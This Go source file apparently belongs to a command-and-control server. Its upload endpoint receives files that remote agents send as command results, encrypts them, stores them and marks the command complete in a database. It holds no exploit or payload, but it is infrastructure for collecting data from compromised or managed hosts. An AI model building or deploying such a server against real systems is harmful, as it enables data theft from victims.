package agent

import (
	"c2/database"
	"c2/utils"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

const MaxUploadSize = 10 << 20

var AllowedExtensions = []string{".jpg", ".jpeg", ".png", ".txt", ".pdf", ".zip"}

// UploadResult handles the file upload and encryption for command results.
// @Summary Upload and encrypt file result of a command
// @Description This endpoint allows an agent to upload a file as the result of a command. The file is then encrypted before being stored on the server.
// @Accept multipart/form-data
// @Produce json
// @Param command_id formData string true "Command ID"
// @Param file formData file true "File result"
// @Success 200 {object} map[string]string "File successfully uploaded and encrypted"
// @Failure 400 {string} string "Invalid input or bad request"
// @Failure 500 {string} string "Internal server error"
// @Router /agent/upload [post]
func UploadResult(w http.ResponseWriter, r *http.Request) {
	err := r.ParseMultipartForm(MaxUploadSize)
	if err != nil {
		utils.LogError("Failed to parse multipart form: " + err.Error())
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	commandID := r.FormValue("command_id")
	if commandID == "" {
		utils.LogError("Missing command_id")
		http.Error(w, "command_id is required", http.StatusBadRequest)
		return
	}

	file, handler, err := r.FormFile("file")
	if err != nil {
		utils.LogError("File not found in form: " + err.Error())
		http.Error(w, "No file provided", http.StatusBadRequest)
		return
	}
	defer file.Close()

	if !isValidExtension(handler.Filename) {
		utils.LogError("Invalid file type")
		http.Error(w, "Invalid file type", http.StatusBadRequest)
		return
	}

	filename := sanitizeFilename(fmt.Sprintf("%s_%d_%s%s", commandID, time.Now().Unix(), hex.EncodeToString(generateRandomSuffix(4)), filepath.Ext(handler.Filename)))

	savePath := filepath.Join("uploads", filename)

	tempFile, err := os.Create(savePath)
	if err != nil {
		utils.LogError("Failed to create temp file: " + err.Error())
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}
	defer tempFile.Close()

	_, err = io.Copy(tempFile, file)
	if err != nil {
		utils.LogError("Failed to write file: " + err.Error())
		http.Error(w, "File write error", http.StatusInternalServerError)
		return
	}

	fileBytes, err := os.ReadFile(savePath)
	if err != nil {
		utils.LogError("Failed to read file before encryption: " + err.Error())
		http.Error(w, "Read error", http.StatusInternalServerError)
		return
	}

	encryptedData, nonce, err := utils.EncryptFile(fileBytes)
	if err != nil {
		utils.LogError("Failed to encrypt file: " + err.Error())
		http.Error(w, "Encryption failed", http.StatusInternalServerError)
		return
	}

	encryptedFilename := "enc_" + filename
	encryptedPath := filepath.Join("uploads", encryptedFilename)
	err = os.WriteFile(encryptedPath, encryptedData, 0644)
	if err != nil {
		utils.LogError("Failed to write encrypted file: " + err.Error())
		http.Error(w, "Write error", http.StatusInternalServerError)
		return
	}

	noncePath := encryptedPath + ".nonce"
	err = os.WriteFile(noncePath, nonce, 0644)
	if err != nil {
		utils.LogWarning("Failed to save nonce, decryption may not be possible later")
	}

	os.Remove(savePath)

	db := database.Connect()
	defer db.Close()

	_, err = db.Exec(`UPDATE commands SET result = ?, status = 'completed', executed_at = ? WHERE id = ?`,
		encryptedFilename, time.Now(), commandID)
	if err != nil {
		utils.LogError("Failed to update command result: " + err.Error())
		http.Error(w, "Database update failed", http.StatusInternalServerError)
		return
	}

	utils.LogInfo("File uploaded and encrypted for command: " + commandID)
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(fmt.Sprintf(`{"status":"ok", "command_id": "%s"}`, commandID)))
}

func isValidExtension(filename string) bool {
	ext := filepath.Ext(filename)
	for _, allowedExt := range AllowedExtensions {
		if ext == allowedExt {
			return true
		}
	}
	return false
}

func sanitizeFilename(filename string) string {
	return filepath.Base(filename)
}

func generateRandomSuffix(length int) []byte {
	suffix := make([]byte, length)
	rand.Read(suffix)
	return suffix
}
